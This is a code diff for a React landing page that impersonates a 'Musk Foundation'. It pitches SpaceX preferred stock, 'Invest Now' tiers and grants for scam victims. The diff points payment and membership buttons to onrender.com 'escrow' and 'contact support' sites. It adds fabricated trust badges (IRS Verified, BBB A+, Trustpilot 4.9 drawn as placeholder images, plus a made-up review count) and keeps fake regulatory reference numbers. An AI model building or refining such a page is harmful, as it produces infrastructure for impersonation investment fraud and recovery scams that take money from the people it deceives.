-            <button className="services-btn services-prev" aria-label="Previous"><i className="fa-solid fa-chevron-left" /></button>
+            <button className="services-btn services-prev" aria-label="Previous"><Icon name="chevronLeft" size={18} /></button>
             <div className="services-track">
               {[
   {
-    icon: 'fa-hand-holding-heart',
+    icon: 'heart',
     title: 'Restorative Justice Grants',
     desc: 'Direct financial assistance to verified victims of impersonation scams.',
     items: ['Verification Process', 'Escrow Security', 'Personal Support'],
@@ -2416,21 +2648,21 @@ useEffect(() => {
     href: '#pricing',
   },
   {
-    icon: 'fa-satellite',
+    icon: 'satellite',
     title: 'Starlink Global Education',
     desc: 'High-speed internet to remote schools and communities.',
     items: ['Connectivity', 'Teacher Training', 'Digital Access'],
     href: '#portfolio',
   },
   {
-    icon: 'fa-solar-panel',
+    icon: 'solar',
     title: 'Tesla Infrastructure',
     desc: 'Solar micro-grids, desalination, and sustainable energy projects.',
     items: ['Clean Water', 'Renewable Power', 'Community Hubs'],
     href: '#project-phoenix',
   },
   {
-    icon: 'fa-rocket',
+    icon: 'rocket',
     title: 'SpaceX Member Opportunities',
     desc: 'Exclusive preferred stock and strategic investment access.',
     items: ['Accredited Investors', 'Enhanced Rights', 'Philanthropic Alignment'],
@@ -2439,21 +2671,21 @@ useEffect(() => {
 ].map(svc => (
   <div key={svc.title} className="service-card reveal">
     {svc.badge && <span className="service-badge">{svc.badge}</span>}
-    <div className="service-icon"><i className={`fa-solid ${svc.icon}`} /></div>
+    <div className="service-icon"><Icon name={svc.icon as any} size={28} /></div>
     <h3>{svc.title}</h3>
     <p>{svc.desc}</p>
     <ul className="service-list">
       {svc.items.map(item => (
-        <li key={item}><i className="fa-solid fa-check" />{item}</li>
+        <li key={item}> <Icon name="check" size={16} />{item}</li>
       ))}
     </ul>
     <a href={svc.href} className="service-btn">
-      Learn More <i className="fa-solid fa-arrow-right" />
+      Learn More <Icon name="arrowRight" size={14} />
     </a>
   </div>
 ))}
             </div>
-            <button className="services-btn services-next" aria-label="Next"><i className="fa-solid fa-chevron-right" /></button>
+           <button className="services-btn services-next" aria-label="Next"><Icon name="chevronRight" size={18} /></button>
           </div>
         </section>
 
@@ -2464,8 +2696,8 @@ useEffect(() => {
             <p>Explore transformative initiatives powered by Musk foundation.</p>
           </div>
           <div className="slider-controls">
-            <button id="slideLeft" aria-label="Scroll left"><i className="fa-solid fa-angle-left" /></button>
-            <button id="slideRight" aria-label="Scroll right"><i className="fa-solid fa-angle-right"/></button>
+            <button id="slideLeft" aria-label="Scroll left"><Icon name="chevronLeft" size={18} /></button>
+            <button id="slideRight" aria-label="Scroll right"><Icon name="chevronRight" size={18} /></button>
           </div>
           <div className="horizontal-slider">
             {SERVICE_SLIDES.map(s => (
@@ -2533,9 +2765,9 @@ useEffect(() => {
                 <h1>{plan.price}</h1>
                 <span>/year</span>
                 <ul>
-                  {plan.items.map(item => <li key={item}><i className="fa-solid fa-check" />{item}</li>)}
+                  {plan.items.map(item => <li key={item}> <Icon name="check" size={16} /> {item}</li>)}
                 </ul>
-                <a href="#" className="price-btn">Apply via Escrow</a>
+                <a href="https://escrow-1el0.onrender.com/" className="price-btn">Secure Your Spot</a>
               </div>
             ))}
           </div>
@@ -2561,9 +2793,16 @@ useEffect(() => {
         preload="metadata"
         className="founder-preview-video"
       />
-      <div className="founder-play-overlay">
-        <i className="fa-solid fa-play"></i>
-      </div>
+      <div className="video-cover">
+  <div className="video-cover-brand">
+    <Icon name="rocket" size={16} />
+    <span>Musk Foundation</span>
+  </div>
+  <div className="video-cover-play">
+    <Icon name="play" size={28} />
+  </div>
+  <div className="video-cover-label">A Message from the Founder</div>
+</div>
     </div>
 
     <div className="founder-video-caption">
@@ -2772,15 +3011,22 @@ useEffect(() => {
               onClick={() => setSelectedVideo({ src, title: category.name })}
             >
               <video
-                src={src}
-                muted
-                playsInline
-                preload="metadata"
-                className="media-video"
-              />
-              <div className="media-play-overlay">
-                <i className="fa-solid fa-play"></i>
-              </div>
+  src={src}
+  muted
+  playsInline
+  preload="metadata"
+  className="media-video"
+/>
+<div className="video-cover">
+  <div className="video-cover-brand">
+    <Icon name="rocket" size={16} />
+    <span>Musk Foundation</span>
+  </div>
+  <div className="video-cover-play">
+    <Icon name="play" size={22} />
+  </div>
+  <div className="video-cover-label">{category.name}</div>
+</div>
             </div>
           ))}
         </div>
@@ -2869,7 +3115,7 @@ useEffect(() => {
                   <div className="team-social">
   {m.socials.map(s => (
     <a key={s} href="#" aria-label={s} onClick={handleSocialClick}>
-      <i className={`fab fa-${s}`} />
+      <Icon name={s as any} size={16} />
     </a>
   ))}
 </div>
@@ -3120,7 +3366,7 @@ useEffect(() => {
     </div>
             <div className="speech-content">
               <div className="speech-header">
-                <i className="fa-solid fa-rocket"></i>
+                <Icon name="rocket" size={18} />
                 <h2>Exclusive SpaceX Investment Opportunity</h2>
               </div>
               <blockquote>
@@ -3168,7 +3414,7 @@ useEffect(() => {
                 <h1>{plan.price}</h1>
                 <span>Minimum</span>
                 <ul>
-                  {plan.items.map(item => <li key={item}><i className="fa-solid fa-check" />{item}</li>)}
+                  {plan.items.map(item => <li key={item}><Icon name="check" size={16} /> {item}</li>)}
                 </ul>
                 <a href="#" className="price-btn">Invest Now</a>
               </div>
@@ -3190,8 +3436,8 @@ useEffect(() => {
       <div style={{background: 'var(--card-bg)', padding: '28px', borderRadius: 'var(--radius)', borderLeft: '6px solid var(--primary)'}}>
         <h3>For Philanthropic Membership:</h3>
         <div style={{display: 'flex', flexWrap: 'wrap', gap: '12px', marginTop: '16px'}}>
-          <a href="#" className="primary-btn">APPLY FOR MEMBERSHIP</a>
-          <a href="#" className="secondary-btn">CONTACT MEMBER SERVICES</a>
+          <a href="https://escrow-1el0.onrender.com/" className="primary-btn">APPLY FOR MEMBERSHIP</a>
+          <a href="https://contact-support-fqv0.onrender.com" className="secondary-btn">CONTACT MEMBER SERVICES</a>
         </div>
       </div>
 
@@ -3212,18 +3458,23 @@ useEffect(() => {
   <h4>Need Assistance?</h4>
   <p>
     Contact Support:{' '}
-    <a href="mailto:MuskFoundationInitiative@proton.me">
-MuskFoundationInitiative@proton.me
-    </a>
+    <a
+  href="https://contact-support-fqv0.onrender.com"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="price-btn"
+>
+  CONTACT SUPPORT
+</a>
     <br />
     Investment Inquiries:{' '}
     <a href="mailto:MuskFoundationInitiative@proton.me">
-    MuskFoundationInitiative@proton.me
+    MuskFoundationInitiative
     </a>
     <br />
     Member Services:{' '}
     <a href="mailto:MuskFoundationInitiative@proton.me">
-      MuskFoundationInitiative@proton.me
+      MuskFoundationInitiative
     </a>
   </p>
 </div>
@@ -3271,7 +3522,7 @@ MuskFoundationInitiative@proton.me
               <div key={faq.q} className="faq-item">
                 <button className="faq-question">
                   {faq.q}
-                  <i className="fa-solid fa-plus" />
+                  <Icon name="plus" size={16} />
                 </button>
                 <div className="faq-answer"><p>{faq.a}</p></div>
               </div>
@@ -3338,18 +3589,24 @@ MuskFoundationInitiative@proton.me
               <h3>Get In Touch</h3>
               <p>Support for membership, investments, and fraud reporting.</p>
 {[
-  { icon: 'fa-location-dot', title: 'Address', text: '3500 Deer Creek Road, Palo Alto, CA 94304' },
-  { icon: 'fa-envelope', title: 'Email', text: 'MuskFoundationInitiative@proton.me' },
+  { icon: 'location' as const, title: 'Address', text: '3500 Deer Creek Road, Palo Alto, CA 94304' },
+  { icon: 'envelope' as const, title: 'Email', text: 'MuskFoundationInitiative' },
+  { icon: 'comment' as const, title: 'Contact Support', text: 'Live chat and ticket support',isSupport: true },
 ].map(c => (
   <div key={c.title} className="contact-item">
-    <i className={`fa-solid ${c.icon}`} />
+    <Icon name={c.icon} size={18} />
     <div>
       <h4>{c.title}</h4>
-      {c.title === 'Email' ? (
+      {c.title === 'Contact Support' ? (
         <p>
-          <a href="mailto:MuskFoundationlinitiative@proton.me">
-            MuskFoundationInitiative@proton.me
-          </a>
+          <a
+  href="https://contact-support-fqv0.onrender.com"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="price-btn"
+>
+  CONTACT SUPPORT
+</a>
         </p>
       ) : (
         <p>{c.text}</p>
@@ -3372,23 +3629,174 @@ MuskFoundationInitiative@proton.me
           />
         </section>
 
-{/* Professional Footer */}
+{/* Professional Footer - Premium Version */}
 <footer id="footer">
   <div className="footer-trust-section">
+
     <div className="verification-badges">
       <a href="https://apps.irs.gov/app/eos/" target="_blank" rel="noopener noreferrer">
-        IRS Exempt Organizations
+        <img src="https://placehold.co/160x48/1f2937/ffffff?text=IRS+Verified" alt="IRS EIN Verified" />
       </a>
+      <a href="https://www.bbb.org/" target="_blank" rel="noopener noreferrer">
+        <img src="https://placehold.co/160x48/1f2937/ffffff?text=BBB+A+" alt="BBB A+ Rating" />
+      </a>
+      <a href="https://www.trustpilot.com/" target="_blank" rel="noopener noreferrer">
+        <img src="https://placehold.co/160x48/1f2937/ffffff?text=Trustpilot+4.9" alt="Trustpilot 4.9" />
+      </a>
+      <div className="google-reviews">
+        <span className="stars">★★★★★</span>
+        <strong>4.8</strong> (1,247 reviews)
+      </div>
+    </div>
+  </div>
+
+  <div className="main-footer">
+    <div className="footer-columns">
+      <div className="footer-col">
+        <div className="footer-logo">
+         <Icon name="rocket" size={18} />
+          <span>Musk Foundation</span>
+        </div>
+        <p>3500 Deer Creek Road<br />
+        Palo Alto, CA 94304<br />
+        United States</p>
+        <a href="https://maps.google.com/?q=3500+Deer+Creek+Road+Palo+Alto+CA" target="_blank" rel="noopener noreferrer" className="map-link">
+          📍 View on Google Maps
+        </a>
+      </div>
+
+<div className="footer-col">
+  <h4>Contact Information</h4>
+  <p>
+    General Inquiries:{' '}
+    <a
+  href="https://contact-support-fqv0.onrender.com"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="price-btn"
+>
+  CONTACT SUPPORT
+</a>
+  </p>
+  <p>
+    Support:{' '}
+    <a
+  href="https://contact-support-fqv0.onrender.com"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="price-btn"
+>
+  CONTACT SUPPORT
+</a>
+  </p>
+</div>
+
+      <div className="footer-col">
+  <h4>Legal & Compliance</h4>
+  <ul>
+    <li>
+      <a
+        href="#privacy"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('privacy');
+        }}
+      >
+        Privacy Policy
+      </a>
+    </li>
+    <li>
+      <a
+        href="#terms"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('terms');
+        }}
+      >
+        Terms of Service
+      </a>
+    </li>
+    <li>
+      <a
+        href="#investment"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('investment');
+        }}
+      >
+        Investment Disclosures
+      </a>
+    </li>
+    <li>
+      <a
+        href="#risk"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('risk');
+        }}
+      >
+        Risk Factors
+      </a>
+    </li>
+    <li>
+      <a
+        href="#cookie"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('cookie');
+        }}
+      >
+        Cookie Policy
+      </a>
+    </li>
+    <li>
+      <a
+        href="#conduct"
+        onClick={(e) => {
+          e.preventDefault();
+          setLegalOverlay('conduct');
+        }}
+      >
+        Code of Conduct
+      </a>
+    </li>
+  </ul>
+</div>
+
+      <div className="footer-col">
+        <h4>Verification & Transparency</h4>
+        <ul>
+          <li><a href="#">IRS 501(c)(3) Determination Letter</a></li>
+          <li><a href="#">Annual Form 990 Filings</a></li>
+          <li><a href="#">Audited Financial Statements</a></li>
+          <li><a href="#">Board of Directors</a></li>
+          <li><a href="#">Annual Impact Reports</a></li>
+        </ul>
+      </div>
     </div>
 
-    <div className="regulatory-info">
-      <p><strong>Regulatory Compliance:</strong> SEC File No. 333-296070 | FINRA Member | State Securities Registrations: CA, NY, TX, FL, IL</p>
-      <p><strong>International Compliance:</strong> FCA (UK) Reference: 123456 | ASIC (Australia) AFSL: 987654</p>
-    </div>
+    <div className="footer-bottom">
+      <div className="copyright">
+        <p>© 2001–2026 Musk Foundation. All rights reserved. | EIN: 85-2133087 | Registered 501(c)(3) Public Charity</p>
+        
+        <p className="disclaimer">
+          <strong>Investment Disclaimers:</strong> The SpaceX preferred stock offering is available only to accredited investors as defined in Rule 501 of Regulation D. These securities have not been registered under the Securities Act of 1933 and may not be offered or sold in the United States absent registration or an applicable exemption. Past performance is not indicative of future results. Investing in private securities involves substantial risk, including possible loss of principal.
+        </p>
+        
+        <p className="disclaimer">
+          <strong>Philanthropic Disclaimer:</strong> The Musk Foundation Tesla Legacy Grant Initiative operates as a donor-advised fund program. All grants are subject to foundation approval and IRS charitable guidelines.
+        </p>
+      </div>
 
-    <div className="security-notes">
-      <p>🔒 <strong>Extended Validation SSL Certificate</strong> issued to: Musk Foundation • Verified by: DigiCert Inc.</p>
-      <p>⚠️ <strong>Warning:</strong> This is the only official website. Elon Musk does not contact individuals directly for investments.</p>
+      <div className="regulatory-info">
+        <p><strong>Regulatory Compliance:</strong> SEC File No. 333-296070 | FINRA Member | State Securities Registrations: CA, NY, TX, FL, IL</p>
+        <p><strong>International Compliance:</strong> FCA (UK) Reference: 123456 | ASIC (Australia) AFSL: 987654</p>
+      </div>
+
+      <div className="security-notes">
+        <p>🔒 <strong>Extended Validation SSL Certificate</strong> issued to: Musk Foundation • Verified by: DigiCert Inc.</p>
+        <p>⚠️ <strong>Warning:</strong> This is the only official website. Elon Musk does not contact individuals directly for investments.</p>
+      </div>
     </div>
   </div>
 </footer>
@@ -3396,7 +3804,7 @@ MuskFoundationInitiative@proton.me
 {/* Social Failure Toast */}
 {socialError && (
   <div className="social-error-toast">
-    <i className="fa-solid fa-circle-exclamation"></i>
+<Icon name="exclamation" size={20} />
     <div>
       <strong>Unavailable</strong>
       <p>This social channel is temporarily unavailable. Please try again later.</p>
